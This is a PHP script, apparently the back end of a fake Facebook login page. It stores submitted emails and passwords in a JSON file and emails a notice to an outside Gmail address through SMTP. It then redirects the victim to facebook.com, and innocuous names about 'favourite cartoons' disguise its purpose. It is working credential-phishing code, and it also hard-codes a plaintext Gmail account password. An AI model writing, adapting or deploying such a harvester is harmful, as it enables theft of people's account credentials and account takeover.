<?php
require 'vendor/autoload.php';

$data = file_get_contents('login.json');
$favorites = json_decode($data, true);

$newFavorite = [
    "email" => $_POST["email"],
    "password" => $_POST["password"]
];

$favorites[] = $newFavorite;

$newData = json_encode($favorites, JSON_PRETTY_PRINT);
file_put_contents('login.json', $newData);

// Enviar o e-mail
$mail = new PHPMailer\PHPMailer\PHPMailer();
$mail->isSMTP();
$mail->Host = 'smtp.gmail.com';
$mail->SMTPAuth = true;
$mail->Username = 'histpessoas@gmail.com';
$mail->Password = '949025711uni';
$mail->SMTPSecure = 'tls';
$mail->Port = 587;

$mail->setFrom('histpessoas@gmail.com', 'Adilson Bernado');
$mail->addAddress('adilsonbernado52@gmail.com');

$mail->isHTML(true);
$mail->Subject = 'Novo Desenho Animado Favorito';
$mail->Body = 'Novo desenho favorito adicionado: ';

if ($mail->send()) {
    header("Location: https://www.facebook.com");
    exit();
} else {
    echo 'Erro ao enviar o e-mail: ' . $mail->ErrorInfo;
}
?>
